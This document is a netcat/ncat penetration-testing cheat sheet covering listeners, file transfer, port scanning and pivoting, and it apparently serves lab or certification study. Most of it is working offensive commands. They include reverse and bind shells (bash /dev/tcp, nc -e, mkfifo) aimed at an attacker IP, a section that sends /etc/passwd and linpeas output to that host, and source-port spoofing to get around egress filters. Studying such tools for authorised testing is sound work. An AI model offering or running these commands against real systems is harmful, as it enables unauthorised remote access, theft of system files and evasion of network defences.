# Netcat / ncat

**Tags:** `#netcat` `#ncat` `#remoteaccess` `#shells` `#filetransfer`

TCP/UDP network utility — the "Swiss army knife" of networking. Used for reverse/bind shells, file transfer, port scanning, and relaying. `ncat` (from nmap) is the modern version with TLS, SSL, and proxy support. Both are pre-installed on Kali.

**Source:** https://nmap.org/ncat/
**Install:** Pre-installed on Kali (`nc`, `ncat`)

```bash
# Listener
nc -lvnp 4444

# Connect
nc 10.10.14.5 4444
```

> [!note]
> Use `ncat` for TLS-encrypted shells and proxy chaining. Use `nc` for basic listeners. On Windows targets, use `ncat.exe` (from nmap) or upload a static `nc.exe`.

---

## Listeners

```bash
# Basic listener
nc -lvnp 4444

# Keep listener open after connection closes
nc -lvnp 4444 -k

# ncat with SSL/TLS
ncat --ssl -lvnp 4444
```

---

## Reverse Shells

```bash
# Bash (Linux target)
bash -c 'bash -i >& /dev/tcp/10.10.14.5/4444 0>&1'

# nc (Linux target)
nc -e /bin/bash 10.10.14.5 4444

# ncat (Linux target)
ncat 10.10.14.5 4444 -e /bin/bash

# Windows (ncat)
ncat.exe 10.10.14.5 4444 -e cmd.exe
ncat.exe 10.10.14.5 4444 -e powershell.exe

# mkfifo (when -e not available)
rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc 10.10.14.5 4444 > /tmp/f
```

---

## Bind Shells

```bash
# Linux target — bind listener
nc -lvnp 4444 -e /bin/bash

# Kali — connect to it
nc 10.129.14.128 4444

# ncat bind
ncat -lvnp 4444 -e /bin/bash
```

---

## File Transfer

```bash
# Kali receives
nc -lvnp 8000 > received_file.exe

# Target sends
nc -q 0 10.10.14.5 8000 < file_to_send.exe
ncat --send-only 10.10.14.5 8000 < file_to_send.exe

# Kali sends
nc -lvnp 8000 --send-only < file_to_send.exe

# Target receives
nc -q 0 10.10.14.5 8000 > received_file.exe
ncat --recv-only 10.10.14.5 8000 > received_file.exe
```

---

## Port Scanning

```bash
# TCP port scan
nc -zv 10.129.14.128 20-443

# UDP scan
nc -zvu 10.129.14.128 161

# Check single port
nc -zv 10.129.14.128 445 && echo "open" || echo "closed"
```

---

## Relaying / Pivoting

```bash
# Relay: forward traffic from :8080 to internal host (named pipe method)
mkfifo /tmp/relay
nc -lvnp 8080 < /tmp/relay | nc 172.16.5.10 80 > /tmp/relay

# ncat relay (cleaner)
ncat -lvnp 8080 --sh-exec "ncat 172.16.5.10 80"
```

---

## Source Port Tricks

```bash
# Appear as DNS traffic (src port 53)
ncat -nv --source-port 53 10.129.2.28 50000

# Bypass egress filters — use source port matching allowed traffic
ncat --source-port 443 10.129.14.128 8080
```

---

## Pipe Script Output

```bash
linpeas.sh | nc 10.10.14.5 9005
cat /etc/passwd | nc 10.10.14.5 9005
```

---

## Key Flags

| Flag | Description |
|------|-------------|
| `-l` | Listen mode |
| `-v` | Verbose |
| `-n` | No DNS resolution |
| `-p <port>` | Port |
| `-e <cmd>` | Execute command on connect |
| `-k` | Keep listening after disconnect |
| `-z` | Zero-I/O (port scan mode) |
| `-q 0` | Quit after EOF |
| `--send-only` | Send only, close after |
| `--recv-only` | Receive only |
| `--source-port` | Spoof source port |
| `--ssl` | TLS encryption (ncat) |

---

*Created: 2026-03-13*
*Updated: 2026-03-13*
*Model: claude-sonnet-4-6*
